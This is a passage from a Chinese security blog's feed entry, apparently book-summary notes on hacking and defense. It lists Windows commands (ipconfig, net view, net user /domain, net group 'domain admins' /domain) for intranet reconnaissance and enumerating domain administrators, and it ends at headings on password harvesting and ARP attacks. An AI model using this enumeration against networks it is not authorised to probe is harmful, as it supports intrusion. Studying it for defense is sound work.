Network，LAN)是指在某一区域内由多台计算机互联成的计算机组。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能<br>决定局域网的主要技术要素为：网络拓扑，传输介质与介质访问控制方法。</p><h3 id="内网信息刺探"><a href="#内网信息刺探" class="headerlink" title="内网信息刺探"></a>内网信息刺探</h3><h4 id="获取主机网络信息"><a href="#获取主机网络信息" class="headerlink" title="获取主机网络信息"></a>获取主机网络信息</h4><p>ipconfig查询这台主机的主机名物理mac地址 IP地址 网关地址以及DNS服务器和DHCP服务器地址等信息。在获取了主机网卡信息之后，如果该主机处于域中，还可以通过的命令提示符获取域信息。<br>使用net view 显示当前域或工作组中的计算机列表，<br>使用net view /domain[:Domain Name]指定要查看其可用计算机的域，<br>net user /domain 查看域用户列表<br>net group “domain admins” /domain 查看管理组成员<br>net user Administrator/domain 查看域管理员信息<br>net /help或者net ？获取net命令可操作对象<br>获取主机用户密码</p><h4 id="APR攻击"><a href="#APR攻击" class="headerlink" title="APR攻击"></a>APR攻击</h4><p>APR协议可以通过Ip地址获取MAC地址</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;黑客攻防web安全实战详解&quot;&gt;&lt;a href=&quot;#黑客攻防web安全实战详解&quot; class=&quot;headerlink&quot; title=&quot;黑客攻防web安全实战详解&quot;&gt;&lt;/a&gt;黑客攻防web安全实战详解&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://oy0tigw51
      
    
    </summary>
    
      <category term="读书摘要" scheme="http://0xmj.club/categories/%E8%AF%BB%E4%B9%A6%E6%91%98%E8%A6%81/"/>
    
    
      <category term="黑客攻防web安全实战详解" scheme="http://0xmj.club/tags/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2web%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/"/>
    
  </entry>
  
</feed>
